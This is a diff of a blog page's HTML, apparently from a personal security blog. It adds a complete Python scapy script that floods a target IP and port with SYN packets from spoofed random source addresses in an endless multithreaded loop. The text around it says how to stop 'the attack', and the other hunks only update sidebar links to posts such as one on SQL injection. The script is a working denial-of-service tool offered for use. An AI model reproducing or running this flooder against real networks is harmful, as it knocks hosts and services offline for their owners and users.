@@ -955,6 +955,53 @@ The problem with that operation is that we always need to resend some packets th
 
 <p>To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.</p>
 
+<figure class="highlight"><pre><code class="language-rube" data-lang="rube">#!/usr/bin/env python
+#########################################
+#
+# SYNflood - A multithreaded SYN Flooder
+# author: arthurnn
+#
+#
+#########################################
+import socket, random, sys, threading
+from scapy.all import *
+
+if len(sys.argv) != 3:
+	print "Usage: %s &lt;Target IP&gt; &lt;Port&gt;" % sys.argv[0]
+	sys.exit(1)
+
+target = sys.argv[1]
+port = int(sys.argv[2])
+
+total = 0
+conf.iface='en1';#network card XD
+
+class sendSYN(threading.Thread):
+	global target, port
+	def __init__(self):
+		threading.Thread.__init__(self)
+	def run(self):
+		i = IP()
+		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+		i.dst = target
+
+		t = TCP()
+		t.sport = random.randint(1,65535)
+		t.dport = port
+		t.flags = 'S'
+
+		send(i/t, verbose=0)
+
+print "Flooding %s:%i with SYN packets." % (target, port)
+while 1:
+	sendSYN().start()
+	total += 1
+	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+
+
+  </code></pre></figure>
+
+
     
 
 
@@ -1019,18 +1066,18 @@ The problem with that operation is that we always need to resend some packets th
     
       <li>
         <h3>
-          <a href="/2017/10/23/Abiha-hidot.html">
-            אביעה חידות
-            <small>23 Oct 2017</small>
+          <a href="/2017/11/27/SQL-Injection.html">
+            SQL Injection
+            <small>27 Nov 2017</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/2017/10/17/heb-page.html">
-            Heb Page TEST!
-            <small>17 Oct 2017</small>
+          <a href="/2017/10/23/Abiha-hidot.html">
+            Nach Riddles!
+            <small>23 Oct 2017</small>
           </a>
         </h3>
       </li>
